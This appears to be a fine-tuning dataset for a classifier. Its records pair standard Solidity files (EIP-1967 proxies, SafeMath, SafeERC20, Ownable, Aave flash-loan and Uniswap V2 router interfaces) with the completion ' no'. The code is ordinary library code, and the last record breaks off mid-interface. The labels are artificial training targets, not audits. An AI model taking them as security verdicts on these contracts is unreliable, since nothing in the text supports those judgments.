{"prompt": "pragma solidity 0.6.12; \n \nimport './UpgradeabilityProxy.sol'; \n \n/** \n * @title BaseAdminUpgradeabilityProxy \n * @dev This contract combines an upgradeability proxy with an authorization \n * mechanism for administrative tasks. \n * All external functions in this contract must be guarded by the \n * `ifAdmin` modifier. See ethereum/solidity#3864 for a Solidity \n * feature proposal that would enable this to be done automatically. \n */ \ncontract BaseAdminUpgradeabilityProxy is BaseUpgradeabilityProxy { \n /** \n * @dev Emitted when the administration has been transferred. \n * @param previousAdmin Address of the previous admin. \n * @param newAdmin Address of the new admin. \n */ \n event AdminChanged(address previousAdmin, address newAdmin); \n \n /** \n * @dev Storage slot with the admin of the contract. \n * This is the keccak-256 hash of \"eip1967.proxy.admin\" subtracted by 1, and is \n * validated in the constructor. \n */ \n bytes32 internal constant ADMIN_SLOT = \n 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103; \n \n /** \n * @dev Modifier to check whether the `msg.sender` is the admin. \n * If it is, it will run the function. Otherwise, it will delegate the call \n * to the implementation. \n */ \n modifier ifAdmin() { \n if (msg.sender == _admin()) { \n _; \n } else { \n _fallback(); \n } \n } \n \n /** \n * @return The address of the proxy admin. \n */ \n function admin() external ifAdmin returns (address) { \n return _admin(); \n } \n \n /** \n * @return The address of the implementation. \n */ \n function implementation() external ifAdmin returns (address) { \n return _implementation(); \n } \n \n /** \n * @dev Changes the admin of the proxy. \n * Only the current admin can call this function. \n * @param newAdmin Address to transfer proxy administration to. \n */ \n function changeAdmin(address newAdmin) external ifAdmin { \n require(newAdmin != address(0), 'Cannot change the admin of a proxy to the zero address'); \n emit AdminChanged(_admin(), newAdmin); \n _setAdmin(newAdmin); \n } \n \n /** \n * @dev Upgrade the backing implementation of the proxy. \n * Only the admin can call this function. \n * @param newImplementation Address of the new implementation. \n */ \n function upgradeTo(address newImplementation) external ifAdmin { \n _upgradeTo(newImplementation); \n } \n \n /** \n * @dev Upgrade the backing implementation of the proxy and call a function \n * on the new implementation. \n * This is useful to initialize the proxied contract. \n * @param newImplementation Address of the new implementation. \n * @param data Data to send as msg.data in the low level call. \n * It should include the signature and the parameters of the function to be called, as described in\n * https://solidity.readthedocs.io/en/v0.4.24/abi-spec.html#function-selector-and-argument-encoding\n */ \n function upgradeToAndCall(address newImplementation, bytes calldata data) \n external \n payable \n ifAdmin \n { \n _upgradeTo(newImplementation); \n (bool success, ) = newImplementation.delegatecall(data); \n require(success); \n } \n \n /** \n * @return adm The admin slot. \n */ \n function _admin() internal view returns (address adm) { \n bytes32 slot = ADMIN_SLOT; \n //solium-disable-next-line \n assembly { \n adm := sload(slot) \n } \n } \n \n /** \n * @dev Sets the address of the proxy admin. \n * @param newAdmin Address of the new proxy admin. \n */ \n function _setAdmin(address newAdmin) internal { \n bytes32 slot = ADMIN_SLOT; \n //solium-disable-next-line \n assembly { \n sstore(slot, newAdmin) \n } \n } \n \n /** \n * @dev Only fall back when the sender is not the admin. \n */ \n function _willFallback() internal virtual override { \n require(msg.sender != _admin(), 'Cannot call fallback function from the proxy admin'); \n super._willFallback(); \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport './BaseAdminUpgradeabilityProxy.sol'; \nimport './InitializableUpgradeabilityProxy.sol'; \n \n/** \n * @title InitializableAdminUpgradeabilityProxy \n * @dev Extends from BaseAdminUpgradeabilityProxy with an initializer for \n * initializing the implementation, admin, and init data. \n */ \ncontract InitializableAdminUpgradeabilityProxy is \n BaseAdminUpgradeabilityProxy, \n InitializableUpgradeabilityProxy \n{ \n /** \n * Contract initializer. \n * @param logic address of the initial implementation. \n * @param admin Address of the proxy administrator. \n * @param data Data to send as msg.data to the implementation to initialize the proxied contract. \n * It should include the signature and the parameters of the function to be called, as described in\n * https://solidity.readthedocs.io/en/v0.4.24/abi-spec.html#function-selector-and-argument-encoding\n * This parameter is optional, if no data is given the initialization call to proxied contract will \n */ \n function initialize( \n address logic, \n address admin, \n bytes memory data \n ) public payable { \n require(_implementation() == address(0)); \n InitializableUpgradeabilityProxy.initialize(logic, data); \n assert(ADMIN_SLOT == bytes32(uint256(keccak256('eip1967.proxy.admin')) - 1)); \n _setAdmin(admin); \n } \n \n /** \n * @dev Only fall back when the sender is not the admin. \n */ \n function _willFallback() internal override(BaseAdminUpgradeabilityProxy, Proxy) { \n BaseAdminUpgradeabilityProxy._willFallback(); \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport './Proxy.sol'; \nimport '../contracts/Address.sol'; \n \n/** \n * @title BaseUpgradeabilityProxy \n * @dev This contract implements a proxy that allows to change the \n * implementation address to which it will delegate. \n * Such a change is called an implementation upgrade. \n */ \ncontract BaseUpgradeabilityProxy is Proxy { \n /** \n * @dev Emitted when the implementation is upgraded. \n * @param implementation Address of the new implementation. \n */ \n event Upgraded(address indexed implementation); \n \n /** \n * @dev Storage slot with the address of the current implementation. \n * This is the keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1, and is \n * validated in the constructor. \n */ \n bytes32 internal constant IMPLEMENTATION_SLOT = \n 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; \n \n /** \n * @dev Returns the current implementation. \n * @return impl Address of the current implementation \n */ \n function _implementation() internal view override returns (address impl) { \n bytes32 slot = IMPLEMENTATION_SLOT; \n //solium-disable-next-line \n assembly { \n impl := sload(slot) \n } \n } \n \n /** \n * @dev Upgrades the proxy to a new implementation. \n * @param newImplementation Address of the new implementation. \n */ \n function _upgradeTo(address newImplementation) internal { \n _setImplementation(newImplementation); \n emit Upgraded(newImplementation); \n } \n \n /** \n * @dev Sets the implementation address of the proxy. \n * @param newImplementation Address of the new implementation. \n */ \n function _setImplementation(address newImplementation) internal { \n require( \n Address.isContract(newImplementation), \n 'Cannot set a proxy implementation to a non-contract address' \n ); \n \n bytes32 slot = IMPLEMENTATION_SLOT; \n \n //solium-disable-next-line \n assembly { \n sstore(slot, newImplementation) \n } \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.6.0; \n \n/** \n * @title Proxy \n * @dev Implements delegation of calls to other contracts, with proper \n * forwarding of return values and bubbling of failures. \n * It defines a fallback function that delegates all calls to the address \n * returned by the abstract _implementation() internal function. \n */ \nabstract contract Proxy { \n /** \n * @dev Fallback function. \n * Implemented entirely in `_fallback`. \n */ \n fallback() external payable { \n _fallback(); \n } \n \n /** \n * @return The Address of the implementation. \n */ \n function _implementation() internal view virtual returns (address); \n \n /** \n * @dev Delegates execution to an implementation contract. \n * This is a low level function that doesn't return to its internal call site. \n * It will return to the external caller whatever the implementation returns. \n * @param implementation Address to delegate. \n */ \n function _delegate(address implementation) internal { \n //solium-disable-next-line \n assembly { \n // Copy msg.data. We take full control of memory in this inline assembly \n // block because it will not return to Solidity code. We overwrite the \n // Solidity scratch pad at memory position 0. \n calldatacopy(0, 0, calldatasize()) \n \n // Call the implementation. \n // out and outsize are 0 because we don't know the size yet. \n let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0) \n \n // Copy the returned data. \n returndatacopy(0, 0, returndatasize()) \n \n switch result \n // delegatecall returns 0 on error. \n case 0 { \n revert(0, returndatasize()) \n } \n default { \n return(0, returndatasize()) \n } \n } \n } \n \n /** \n * @dev Function that is run as the first thing in the fallback function. \n * Can be redefined in derived contracts to add functionality. \n * Redefinitions must call super._willFallback(). \n */ \n function _willFallback() internal virtual {} \n \n /** \n * @dev fallback implementation. \n * Extracted to enable manual triggering. \n */ \n function _fallback() internal { \n _willFallback(); \n _delegate(_implementation()); \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport './BaseUpgradeabilityProxy.sol'; \n \n/** \n * @title InitializableUpgradeabilityProxy \n * @dev Extends BaseUpgradeabilityProxy with an initializer for initializing \n * implementation and init data. \n */ \ncontract InitializableUpgradeabilityProxy is BaseUpgradeabilityProxy { \n /** \n * @dev Contract initializer. \n * @param _logic Address of the initial implementation. \n * @param _data Data to send as msg.data to the implementation to initialize the proxied contract. \n * It should include the signature and the parameters of the function to be called, as described in\n * https://solidity.readthedocs.io/en/v0.4.24/abi-spec.html#function-selector-and-argument-encoding\n * This parameter is optional, if no data is given the initialization call to proxied contract will \n */ \n function initialize(address _logic, bytes memory _data) public payable { \n require(_implementation() == address(0)); \n assert(IMPLEMENTATION_SLOT == bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1)); \n _setImplementation(_logic); \n if (_data.length > 0) { \n (bool success, ) = _logic.delegatecall(_data); \n require(success); \n } \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.4.24 <0.7.0; \n \n/** \n * @title Initializable \n * \n * @dev Helper contract to support initializer functions. To use it, replace \n * the constructor with a function that has the `initializer` modifier. \n * WARNING: Unlike constructors, initializer functions must be manually \n * invoked. This applies both to deploying an Initializable contract, as well \n * as extending an Initializable contract via inheritance. \n * WARNING: When used with inheritance, manual care must be taken to not invoke \n * a parent initializer twice, or ensure that all initializers are idempotent, \n * because this is not dealt with automatically as with constructors. \n */ \ncontract Initializable { \n /** \n * @dev Indicates that the contract has been initialized. \n */ \n bool private initialized; \n \n /** \n * @dev Indicates that the contract is in the process of being initialized. \n */ \n bool private initializing; \n \n /** \n * @dev Modifier to use in the initializer function of a contract. \n */ \n modifier initializer() { \n require( \n initializing || isConstructor() || !initialized, \n 'Contract instance has already been initialized' \n ); \n \n bool isTopLevelCall = !initializing; \n if (isTopLevelCall) { \n initializing = true; \n initialized = true; \n } \n \n _; \n \n if (isTopLevelCall) { \n initializing = false; \n } \n } \n \n /// @dev Returns true if and only if the function is running in the constructor \n function isConstructor() private view returns (bool) { \n // extcodesize checks the size of the code stored in an address, and \n // address returns the current address. Since the code is still not \n // deployed when running a constructor, any checks on its code size will \n // yield zero, making it an effective way to detect if a contract is \n // under construction or not. \n uint256 cs; \n //solium-disable-next-line \n assembly { \n cs := extcodesize(address()) \n } \n return cs == 0; \n } \n \n // Reserved storage space to allow for layout changes in the future. \n uint256[50] private ______gap; \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport './BaseAdminUpgradeabilityProxy.sol'; \n \n/** \n * @title AdminUpgradeabilityProxy \n * @dev Extends from BaseAdminUpgradeabilityProxy with a constructor for \n * initializing the implementation, admin, and init data. \n */ \ncontract AdminUpgradeabilityProxy is BaseAdminUpgradeabilityProxy, UpgradeabilityProxy { \n /** \n * Contract constructor. \n * @param _logic address of the initial implementation. \n * @param _admin Address of the proxy administrator. \n * @param _data Data to send as msg.data to the implementation to initialize the proxied contract. \n * It should include the signature and the parameters of the function to be called, as described in\n * https://solidity.readthedocs.io/en/v0.4.24/abi-spec.html#function-selector-and-argument-encoding\n * This parameter is optional, if no data is given the initialization call to proxied contract will \n */ \n constructor( \n address _logic, \n address _admin, \n bytes memory _data \n ) public payable UpgradeabilityProxy(_logic, _data) { \n assert(ADMIN_SLOT == bytes32(uint256(keccak256('eip1967.proxy.admin')) - 1)); \n _setAdmin(_admin); \n } \n \n /** \n * @dev Only fall back when the sender is not the admin. \n */ \n function _willFallback() internal override(BaseAdminUpgradeabilityProxy, Proxy) { \n BaseAdminUpgradeabilityProxy._willFallback(); \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport './BaseUpgradeabilityProxy.sol'; \n \n/** \n * @title UpgradeabilityProxy \n * @dev Extends BaseUpgradeabilityProxy with a constructor for initializing \n * implementation and init data. \n */ \ncontract UpgradeabilityProxy is BaseUpgradeabilityProxy { \n /** \n * @dev Contract constructor. \n * @param _logic Address of the initial implementation. \n * @param _data Data to send as msg.data to the implementation to initialize the proxied contract. \n * It should include the signature and the parameters of the function to be called, as described in\n * https://solidity.readthedocs.io/en/v0.4.24/abi-spec.html#function-selector-and-argument-encoding\n * This parameter is optional, if no data is given the initialization call to proxied contract will \n */ \n constructor(address _logic, bytes memory _data) public payable { \n assert(IMPLEMENTATION_SLOT == bytes32(uint256(keccak256('eip1967.proxy.implementation')) - 1)); \n _setImplementation(_logic); \n if (_data.length > 0) { \n (bool success, ) = _logic.delegatecall(_data); \n require(success); \n } \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {IERC20} from './IERC20.sol'; \n \ninterface IERC20Detailed is IERC20 { \n function name() external view returns (string memory); \n \n function symbol() external view returns (string memory); \n \n function decimals() external view returns (uint8); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n/** \n * @dev Interface of the ERC20 standard as defined in the EIP. \n */ \ninterface IERC20 { \n /** \n * @dev Returns the amount of tokens in existence. \n */ \n function totalSupply() external view returns (uint256); \n \n /** \n * @dev Returns the amount of tokens owned by `account`. \n */ \n function balanceOf(address account) external view returns (uint256); \n \n /** \n * @dev Moves `amount` tokens from the caller's account to `recipient`. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n /** \n * @dev Returns the remaining number of tokens that `spender` will be \n * allowed to spend on behalf of `owner` through {transferFrom}. This is \n * zero by default. \n * \n * This value changes when {approve} or {transferFrom} are called. \n */ \n function allowance(address owner, address spender) external view returns (uint256); \n \n /** \n * @dev Sets `amount` as the allowance of `spender` over the caller's tokens. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * IMPORTANT: Beware that changing an allowance with this method brings the risk \n * that someone may use both the old and the new allowance by unfortunate \n * transaction ordering. One possible solution to mitigate this race \n * condition is to first reduce the spender's allowance to 0 and set the \n * desired value afterwards: \n * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 \n * \n * Emits an {Approval} event. \n */ \n function approve(address spender, uint256 amount) external returns (bool); \n \n /** \n * @dev Moves `amount` tokens from `sender` to `recipient` using the \n * allowance mechanism. `amount` is then deducted from the caller's \n * allowance. \n * \n * Returns a boolean value indicating whether the operation succeeded. \n * \n * Emits a {Transfer} event. \n */ \n function transferFrom( \n address sender, \n address recipient, \n uint256 amount \n ) external returns (bool); \n \n /** \n * @dev Emitted when `value` tokens are moved from one account (`from`) to \n * another (`to`). \n * \n * Note that `value` may be zero. \n */ \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n /** \n * @dev Emitted when the allowance of a `spender` for an `owner` is set by \n * a call to {approve}. `value` is the new allowance. \n */ \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n/** \n * @dev Collection of functions related to the address type \n */ \nlibrary Address { \n /** \n * @dev Returns true if `account` is a contract. \n * \n * [IMPORTANT] \n * ==== \n * It is unsafe to assume that an address for which this function returns \n * false is an externally-owned account (EOA) and not a contract. \n * \n * Among others, `isContract` will return false for the following \n * types of addresses: \n * \n * - an externally-owned account \n * - a contract in construction \n * - an address where a contract will be created \n * - an address where a contract lived, but was destroyed \n * ==== \n */ \n function isContract(address account) internal view returns (bool) { \n // According to EIP-1052, 0x0 is the value returned for not-yet created accounts \n // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned \n // for accounts without code, i.e. `keccak256('')` \n bytes32 codehash; \n bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470; \n // solhint-disable-next-line no-inline-assembly \n assembly { \n codehash := extcodehash(account) \n } \n return (codehash != accountHash && codehash != 0x0); \n } \n \n /** \n * @dev Replacement for Solidity's `transfer`: sends `amount` wei to \n * `recipient`, forwarding all available gas and reverting on errors. \n * \n * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost \n * of certain opcodes, possibly making contracts go over the 2300 gas limit \n * imposed by `transfer`, making them unable to receive funds via \n * `transfer`. {sendValue} removes this limitation. \n * \n * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more]. \n * \n * IMPORTANT: because control is transferred to `recipient`, care must be \n * taken to not create reentrancy vulnerabilities. Consider using \n * {ReentrancyGuard} or the \n * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-i\n */ \n function sendValue(address payable recipient, uint256 amount) internal { \n require(address(this).balance >= amount, 'Address: insufficient balance'); \n \n // solhint-disable-next-line avoid-low-level-calls, avoid-call-value \n (bool success, ) = recipient.call{value: amount}(''); \n require(success, 'Address: unable to send value, recipient may have reverted'); \n } \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity ^0.6.0; \n \nimport './Context.sol'; \n \n/** \n * @dev Contract module which provides a basic access control mechanism, where \n * there is an account (an owner) that can be granted exclusive access to \n * specific functions. \n * \n * By default, the owner account will be the one that deploys the contract. This \n * can later be changed with {transferOwnership}. \n * \n * This module is used through inheritance. It will make available the modifier \n * `onlyOwner`, which can be applied to your functions to restrict their use to \n * the owner. \n */ \ncontract Ownable is Context { \n address private _owner; \n \n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); \n \n /** \n * @dev Initializes the contract setting the deployer as the initial owner. \n */ \n constructor() internal { \n address msgSender = _msgSender(); \n _owner = msgSender; \n emit OwnershipTransferred(address(0), msgSender); \n } \n \n /** \n * @dev Returns the address of the current owner. \n */ \n function owner() public view returns (address) { \n return _owner; \n } \n \n /** \n * @dev Throws if called by any account other than the owner. \n */ \n modifier onlyOwner() { \n require(_owner == _msgSender(), 'Ownable: caller is not the owner'); \n _; \n } \n \n /** \n * @dev Leaves the contract without owner. It will not be possible to call \n * `onlyOwner` functions anymore. Can only be called by the current owner. \n * \n * NOTE: Renouncing ownership will leave the contract without an owner, \n * thereby removing any functionality that is only available to the owner. \n */ \n function renounceOwnership() public virtual onlyOwner { \n emit OwnershipTransferred(_owner, address(0)); \n _owner = address(0); \n } \n \n /** \n * @dev Transfers ownership of the contract to a new account (`newOwner`). \n * Can only be called by the current owner. \n */ \n function transferOwnership(address newOwner) public virtual onlyOwner { \n require(newOwner != address(0), 'Ownable: new owner is the zero address'); \n emit OwnershipTransferred(_owner, newOwner); \n _owner = newOwner; \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n/** \n * @dev Wrappers over Solidity's arithmetic operations with added overflow \n * checks. \n * \n * Arithmetic operations in Solidity wrap on overflow. This can easily result \n * in bugs, because programmers usually assume that an overflow raises an \n * error, which is the standard behavior in high level programming languages. \n * `SafeMath` restores this intuition by reverting the transaction when an \n * operation overflows. \n * \n * Using this library instead of the unchecked operations eliminates an entire \n * class of bugs, so it's recommended to use it always. \n */ \nlibrary SafeMath { \n /** \n * @dev Returns the addition of two unsigned integers, reverting on \n * overflow. \n * \n * Counterpart to Solidity's `+` operator. \n * \n * Requirements: \n * - Addition cannot overflow. \n */ \n function add(uint256 a, uint256 b) internal pure returns (uint256) { \n uint256 c = a + b; \n require(c >= a, 'SafeMath: addition overflow'); \n \n return c; \n } \n \n /** \n * @dev Returns the subtraction of two unsigned integers, reverting on \n * overflow (when the result is negative). \n * \n * Counterpart to Solidity's `-` operator. \n * \n * Requirements: \n * - Subtraction cannot overflow. \n */ \n function sub(uint256 a, uint256 b) internal pure returns (uint256) { \n return sub(a, b, 'SafeMath: subtraction overflow'); \n } \n \n /** \n * @dev Returns the subtraction of two unsigned integers, reverting with custom message on \n * overflow (when the result is negative). \n * \n * Counterpart to Solidity's `-` operator. \n * \n * Requirements: \n * - Subtraction cannot overflow. \n */ \n function sub( \n uint256 a, \n uint256 b, \n string memory errorMessage \n ) internal pure returns (uint256) { \n require(b <= a, errorMessage); \n uint256 c = a - b; \n \n return c; \n } \n \n /** \n * @dev Returns the multiplication of two unsigned integers, reverting on \n * overflow. \n * \n * Counterpart to Solidity's `*` operator. \n * \n * Requirements: \n * - Multiplication cannot overflow. \n */ \n function mul(uint256 a, uint256 b) internal pure returns (uint256) { \n // Gas optimization: this is cheaper than requiring 'a' not being zero, but the \n // benefit is lost if 'b' is also tested. \n // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522 \n if (a == 0) { \n return 0; \n } \n \n uint256 c = a * b; \n require(c / a == b, 'SafeMath: multiplication overflow'); \n \n return c; \n } \n \n /** \n * @dev Returns the integer division of two unsigned integers. Reverts on \n * division by zero. The result is rounded towards zero. \n * \n * Counterpart to Solidity's `/` operator. Note: this function uses a \n * `revert` opcode (which leaves remaining gas untouched) while Solidity \n * uses an invalid opcode to revert (consuming all remaining gas). \n * \n * Requirements: \n * - The divisor cannot be zero. \n */ \n function div(uint256 a, uint256 b) internal pure returns (uint256) { \n return div(a, b, 'SafeMath: division by zero'); \n } \n \n /** \n * @dev Returns the integer division of two unsigned integers. Reverts with custom message on \n * division by zero. The result is rounded towards zero. \n * \n * Counterpart to Solidity's `/` operator. Note: this function uses a \n * `revert` opcode (which leaves remaining gas untouched) while Solidity \n * uses an invalid opcode to revert (consuming all remaining gas). \n * \n * Requirements: \n * - The divisor cannot be zero. \n */ \n function div( \n uint256 a, \n uint256 b, \n string memory errorMessage \n ) internal pure returns (uint256) { \n // Solidity only automatically asserts when dividing by 0 \n require(b > 0, errorMessage); \n uint256 c = a / b; \n // assert(a == b * c + a % b); // There is no case in which this doesn't hold \n \n return c; \n } \n \n /** \n * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo), \n * Reverts when dividing by zero. \n * \n * Counterpart to Solidity's `%` operator. This function uses a `revert` \n * opcode (which leaves remaining gas untouched) while Solidity uses an \n * invalid opcode to revert (consuming all remaining gas). \n * \n * Requirements: \n * - The divisor cannot be zero. \n */ \n function mod(uint256 a, uint256 b) internal pure returns (uint256) { \n return mod(a, b, 'SafeMath: modulo by zero'); \n } \n \n /** \n * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo), \n * Reverts with custom message when dividing by zero. \n * \n * Counterpart to Solidity's `%` operator. This function uses a `revert` \n * opcode (which leaves remaining gas untouched) while Solidity uses an \n * invalid opcode to revert (consuming all remaining gas). \n * \n * Requirements: \n * - The divisor cannot be zero. \n */ \n function mod( \n uint256 a, \n uint256 b, \n string memory errorMessage \n ) internal pure returns (uint256) { \n require(b != 0, errorMessage); \n return a % b; \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n/* \n * @dev Provides information about the current execution context, including the \n * sender of the transaction and its data. While these are generally available \n * via msg.sender and msg.data, they should not be accessed in such a direct \n * manner, since when dealing with GSN meta-transactions the account sending and \n * paying for execution may not be the actual sender (as far as an application \n * is concerned). \n * \n * This contract is only required for intermediate, library-like contracts. \n */ \nabstract contract Context { \n function _msgSender() internal view virtual returns (address payable) { \n return msg.sender; \n } \n \n function _msgData() internal view virtual returns (bytes memory) { \n this; // silence state mutability warning without generating bytecode - see https://github.com/et\n return msg.data; \n } \n} \n \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {IERC20} from './IERC20.sol'; \nimport {SafeMath} from './SafeMath.sol'; \nimport {Address} from './Address.sol'; \n \n/** \n * @title SafeERC20 \n * @dev Wrappers around ERC20 operations that throw on failure (when the token \n * contract returns false). Tokens that return no value (and instead revert or \n * throw on failure) are also supported, non-reverting calls are assumed to be \n * successful. \n * To use this library you can add a `using SafeERC20 for IERC20;` statement to your contract, \n * which allows you to call the safe operations as `token.safeTransfer(...)`, etc. \n */ \nlibrary SafeERC20 { \n using SafeMath for uint256; \n using Address for address; \n \n function safeTransfer( \n IERC20 token, \n address to, \n uint256 value \n ) internal { \n callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value)); \n } \n \n function safeTransferFrom( \n IERC20 token, \n address from, \n address to, \n uint256 value \n ) internal { \n callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value)); \n } \n \n function safeApprove( \n IERC20 token, \n address spender, \n uint256 value \n ) internal { \n require( \n (value == 0) || (token.allowance(address(this), spender) == 0), \n 'SafeERC20: approve from non-zero to non-zero allowance' \n ); \n callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value)); \n } \n \n function callOptionalReturn(IERC20 token, bytes memory data) private { \n require(address(token).isContract(), 'SafeERC20: call to non-contract'); \n \n // solhint-disable-next-line avoid-low-level-calls \n (bool success, bytes memory returndata) = address(token).call(data); \n require(success, 'SafeERC20: low-level call failed'); \n \n if (returndata.length > 0) { \n // Return data is optional \n // solhint-disable-next-line max-line-length \n require(abi.decode(returndata, (bool)), 'SafeERC20: ERC20 operation did not succeed'); \n } \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {ILendingPoolAddressesProvider} from '../../interfaces/ILendingPoolAddressesProvider.sol'; \nimport {ILendingPool} from '../../interfaces/ILendingPool.sol'; \n \n/** \n * @title IFlashLoanReceiver interface \n * @notice Interface for the Aave fee IFlashLoanReceiver. \n * @author Aave \n * @dev implement this interface to develop a flashloan-compatible flashLoanReceiver contract \n **/ \ninterface IFlashLoanReceiver { \n function executeOperation( \n address[] calldata assets, \n uint256[] calldata amounts, \n uint256[] calldata premiums, \n address initiator, \n bytes calldata params \n ) external returns (bool); \n \n function ADDRESSES_PROVIDER() external view returns (ILendingPoolAddressesProvider); \n \n function LENDING_POOL() external view returns (ILendingPool); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {SafeMath} from '../../dependencies/openzeppelin/contracts/SafeMath.sol'; \nimport {IERC20} from '../../dependencies/openzeppelin/contracts/IERC20.sol'; \nimport {SafeERC20} from '../../dependencies/openzeppelin/contracts/SafeERC20.sol'; \nimport {IFlashLoanReceiver} from '../interfaces/IFlashLoanReceiver.sol'; \nimport {ILendingPoolAddressesProvider} from '../../interfaces/ILendingPoolAddressesProvider.sol'; \nimport {ILendingPool} from '../../interfaces/ILendingPool.sol'; \n \nabstract contract FlashLoanReceiverBase is IFlashLoanReceiver { \n using SafeERC20 for IERC20; \n using SafeMath for uint256; \n \n ILendingPoolAddressesProvider public immutable override ADDRESSES_PROVIDER; \n ILendingPool public immutable override LENDING_POOL; \n \n constructor(ILendingPoolAddressesProvider provider) public { \n ADDRESSES_PROVIDER = provider; \n LENDING_POOL = ILendingPool(provider.getLendingPool()); \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \ncontract IERC20DetailedBytes { \n bytes32 public name; \n bytes32 public symbol; \n uint256 public decimals; \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.2; \n \nimport './IUniswapV2Router01.sol'; \n \ninterface IUniswapV2Router02 is IUniswapV2Router01 { \n function removeLiquidityETHSupportingFeeOnTransferTokens( \n address token, \n uint256 liquidity, \n uint256 amountTokenMin, \n uint256 amountETHMin, \n address to, \n uint256 deadline \n ) external returns (uint256 amountETH); \n \n function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens( \n address token, \n uint256 liquidity, \n uint256 amountTokenMin, \n uint256 amountETHMin, \n address to, \n uint256 deadline, \n bool approveMax, \n uint8 v, \n bytes32 r, \n bytes32 s \n ) external returns (uint256 amountETH); \n \n function swapExactTokensForTokensSupportingFeeOnTransferTokens( \n uint256 amountIn, \n uint256 amountOutMin, \n address[] calldata path, \n address to, \n uint256 deadline \n ) external; \n \n function swapExactETHForTokensSupportingFeeOnTransferTokens( \n uint256 amountOutMin, \n address[] calldata path, \n address to, \n uint256 deadline \n ) external payable; \n \n function swapExactTokensForETHSupportingFeeOnTransferTokens( \n uint256 amountIn, \n uint256 amountOutMin, \n address[] calldata path, \n address to, \n uint256 deadline \n ) external; \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity >=0.6.2; \n \ninterface IUniswapV2Router01 { \n function factory() external pure returns (address); \n \n function WETH() external pure returns (address); \n \n function addLiquidity( \n address tokenA, \n address tokenB, \n uint256 amountADesired, \n uint256 amountBDesired, \n uint256 amountAMin, \n uint256 amountBMin, \n address to, \n uint256 deadline \n ) \n external \n returns ( \n uint256 amountA, \n uint256 amountB, \n uint256 liquidity \n ); \n \n function addLiquidityETH( \n address token, \n uint256 amountTokenDesired, \n uint256 amountTokenMin, \n uint256 amountETHMin, \n address to, \n uint256 deadline \n ) \n external \n payable \n returns ( \n uint256 amountToken, \n uint256 amountETH, \n uint256 liquidity \n ); \n \n function removeLiquidity( \n address tokenA, \n address tokenB, \n uint256 liquidity, \n uint256 amountAMin, \n uint256 amountBMin, \n address to, \n uint256 deadline \n ) external returns (uint256 amountA, uint256 amountB); \n \n function removeLiquidityETH( \n address token, \n uint256 liquidity, \n uint256 amountTokenMin, \n uint256 amountETHMin, \n address to, \n uint256 deadline \n ) external returns (uint256 amountToken, uint256 amountETH); \n \n function removeLiquidityWithPermit( \n address tokenA, \n address tokenB, \n uint256 liquidity, \n uint256 amountAMin, \n uint256 amountBMin, \n address to, \n uint256 deadline, \n bool approveMax, \n uint8 v, \n bytes32 r, \n bytes32 s \n ) external returns (uint256 amountA, uint256 amountB); \n \n function removeLiquidityETHWithPermit( \n address token, \n uint256 liquidity, \n uint256 amountTokenMin, \n uint256 amountETHMin, \n address to, \n uint256 deadline, \n bool approveMax, \n uint8 v, \n bytes32 r, \n bytes32 s \n ) external returns (uint256 amountToken, uint256 amountETH); \n \n function swapExactTokensForTokens( \n uint256 amountIn, \n uint256 amountOutMin, \n address[] calldata path, \n address to, \n uint256 deadline \n ) external returns (uint256[] memory amounts); 